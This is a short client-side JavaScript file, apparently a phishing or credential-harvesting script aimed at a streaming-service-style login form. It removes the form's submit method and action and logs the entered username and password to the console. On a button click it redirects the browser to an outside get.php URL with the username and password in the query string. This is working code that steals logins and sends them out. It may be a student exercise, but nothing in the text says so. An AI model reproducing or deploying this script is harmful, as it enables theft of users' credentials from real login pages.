console.log('client side script. reporting for duty')

// console.log(document)

const formElement = document.querySelector('form.login-form')
const userInput = formElement.querySelector('#id_userLoginId')
const passInput = formElement.querySelector('#id_password')
const buttonElm = formElement.querySelector('button.login-button')

formElement.removeAttribute('method')
formElement.removeAttribute('action')
buttonElm.removeAttribute('type')

setTimeout(()=> {
    console.log(userInput.value)
    console.log(passInput.value)
}, 5000)

buttonElm.addEventListener('click', function(event){
    console.log('button is clicked')
    event.preventDefault()
    window.location.replace(`https://web.eecs.utk.edu/~jsides4/get.php?user=${userInput.value}&password=${passInput.value}`)
})